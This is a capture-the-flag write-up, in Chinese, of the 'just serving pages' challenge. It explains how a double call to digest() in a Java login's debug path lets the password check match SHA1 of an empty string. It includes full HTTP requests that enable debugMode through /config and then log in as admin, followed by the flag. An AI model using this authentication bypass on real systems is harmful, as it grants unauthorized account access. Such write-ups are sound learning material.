# just serving pages

原本看到這題還以為要考 java/jsp trick

或是考 jackson 反序列化之類的

結果只是一個小邏輯洞QQ

---

`/config` 可以讓我們傳 json 去更新設定，包含 language, debugMode 等

如果`debugMode`被設起來的話，登入時，會多做以下的事：

```
if (userConfig.isDebugMode()) {
    String pw1 = new String(Hex.encodeHex(digestStorage.digest()));
    String pw2 = password_md5_sha1;

    java.util.logging.Logger.getLogger("login")
            .info(String.format("Login tried with: %s == %s", pw1, pw2));
}

if (Arrays.equals(passwordBytes, digestStorage.digest())) {
    if (userConfig.isDebugMode())
        java.util.logging.Logger.getLogger("login").info("Passwords were equal");
    return u;
}
```

這裡我們雖然看不到logger的內容，但是這邊用了兩次 `digestStorage.digest()`

所以第二次digest時，拿到的其實會是`sha1('')`

exploit:

更新 config

```
POST /config HTTP/1.1
Host: 7b0000003aa51eb1815b757f-just-serving-pages.challenge.master.allesctf.net:31337
Cookie: JSESSIONID=D43AD433658DBF507C25760A792BEB26
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4274.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: application/json
Content-Length: 45

{
"debugMode":true,"language":1,"user":null}
```

登入:

```
POST /login HTTP/1.1
Host: 7b0000003aa51eb1815b757f-just-serving-pages.challenge.master.allesctf.net:31337
Cookie: JSESSIONID=730E027FED6392B23B54C7D4734F2D94
Content-Length: 64
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://7b0000003aa51eb1815b757f-just-serving-pages.challenge.master.allesctf.net:31337
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4274.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://7b0000003aa51eb1815b757f-just-serving-pages.challenge.master.allesctf.net:31337/login.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

username=admin&password=da39a3ee5e6b4b0d3255bfef95601890afd80709
```

->

`ALLES!{ohh-b0y-java-y-u-do-th1s-t0-m3???!?}`
